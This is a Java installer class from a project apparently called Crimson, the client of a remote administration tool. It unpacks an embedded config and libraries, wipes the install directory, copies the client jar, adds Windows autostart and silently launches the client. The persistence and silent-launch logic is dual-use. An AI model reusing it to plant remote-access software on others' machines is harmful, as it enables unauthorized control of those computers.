/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.client;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URISyntaxException;

import com.subterranean_security.crimson.client.modules.Autostart;
import com.subterranean_security.crimson.core.platform.Platform;
import com.subterranean_security.crimson.core.platform.info.OS.OSFAMILY;
import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
import com.subterranean_security.crimson.core.util.B64Util;
import com.subterranean_security.crimson.core.util.FileUtil;
import com.subterranean_security.crimson.universal.JarUtil;
import com.subterranean_security.crimson.universal.Universal;

public class Installer {

	public static ClientConfig ic;
	public static String jarPath;
	public static String jarDir;
	private static OSFAMILY os;

	private static boolean debug = new File("/debug.txt").exists();

	public static void main(String[] args) {

		try {
			jarPath = Client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
			jarDir = new File(jarPath).getParent();
		} catch (URISyntaxException e) {
			System.out.println("Code source error!");
			System.exit(1);
		}

		if (isInstalled()) {
			Client.main(args);
			return;
		}

		// don't use method in CUtil because it loads Common.java
		File temp = new File(System.getProperty("java.io.tmpdir") + "/client_install");
		temp.mkdir();

		if (!Universal.loadTemporarily("com/subterranean_security/crimson/client/res/bin/lib.zip", temp)) {
			System.out.println("Failed to load requisite libraries");
			System.exit(1);
		}

		os = Platform.osFamily;

		try {
			ic = readInternal();
		} catch (Exception e) {
			System.out.println("Fatal: Could not read internal.txt");
			System.exit(1);
		}

		String base = null;
		switch (os) {
		case SOL:
			base = ic.getPathSol();
			break;
		case BSD:
			base = ic.getPathBsd();
			break;
		case LIN:
			base = ic.getPathLin();
			break;
		case OSX:
			base = ic.getPathOsx();
			break;
		case WIN:
			base = ic.getPathWin();
			break;
		default:
			break;
		}

		if (install(base.replaceAll("\\%USERNAME\\%", System.getProperty("user.name")))) {
			System.out.println("Install Success");
		} else {
			System.out.println("Install Failed");
		}
		FileUtil.delete(temp);

	}

	public static boolean packagedLibsFound() {
		return Installer.class.getResourceAsStream("/com/subterranean_security/crimson/client/res/bin/lib.zip") != null;
	}

	private static ClientConfig readInternal() throws Exception {
		InputStream in = Client.class.getResourceAsStream("/com/subterranean_security/crimson/client/internal.txt");

		BufferedReader input = new BufferedReader(new InputStreamReader(in));

		ClientConfig cc = ClientConfig.parseFrom(B64Util.decode(input.readLine()));
		input.close();

		return cc;
	}

	public static boolean isInstalled() {
		if (!new File(jarDir + "/var/client.db").exists()) {
			return false;
		}

		if (!new File(jarDir + "/lib/java/c09.jar").exists()) {
			return false;
		}

		return true;
	}

	public static boolean install(String base) {
		System.out.println("Starting installation");

		if (!base.endsWith(File.separator)) {
			base += File.separator;
		}

		File baseFile = new File(base);

		if (!baseFile.exists() && !baseFile.mkdirs()) {
			System.out.println("Failed to create install base");
			return false;
		}

		for (File f : baseFile.listFiles()) {
			if (!f.getName().equals("var")) {
				FileUtil.delete(f);
			}
		}

		(new File(base + "var")).mkdirs();
		(new File(base + "tmp")).mkdirs();
		(new File(base + "lib")).mkdirs();

		System.out.println("Extracting lib.zip");

		JarUtil.extract("com/subterranean_security/crimson/client/res/bin/lib.zip", base + "lib/lib.zip");
		try {
			FileUtil.unzip(base + "lib/lib.zip", base + "lib/");
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
			return false;
		}

		System.out.println("Extracting client database");
		File db = new File(base + "var/client.db");
		if (!db.exists()) {
			JarUtil.extract("com/subterranean_security/crimson/client/res/bin/client.db", db.getAbsolutePath());
		}

		System.out.println("Copying client jar");
		File client = new File(base + "/client.jar");
		try {
			FileUtil.copy(new File(jarPath), client);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			System.out.println("Failed to copy client jar");
			return false;
		}

		if (ic.getAutostart()) {
			switch (os) {
			case SOL:
			case BSD:
			case LIN:
			case OSX:
				break;
			case WIN:
				Autostart.install_win(client);
				break;
			default:
				break;

			}
		}

		if (!debug) {
			try {
				Runtime.getRuntime().exec(os.getJavaw() + " -jar " + client.getAbsolutePath());
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				return false;
			}
		}

		return true;
	}
}
